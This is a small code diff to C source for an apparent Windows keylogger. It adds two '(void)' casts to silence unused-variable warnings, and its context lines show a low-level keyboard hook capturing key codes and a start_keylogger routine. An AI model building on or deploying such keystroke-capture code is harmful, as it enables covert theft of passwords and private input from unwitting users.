@@ -120,6 +120,7 @@ LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
         KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
         DWORD vkCode = pKeyboard->vkCode;
+        (void)vkCode;  // Reserved for future use
 
         // Get the KeylogBuffer pointer from thread local storage or global state
         // This would need to be managed by the caller
@@ -154,6 +155,7 @@ char* start_keylogger() {
     int remaining = 8192;
     
     int count = 0;
+    (void)count;  // Reserved for future use
     int entries_len = 0;
     KeylogEntry* entries = GetKeylogEntries(buffer, &entries_len);
     
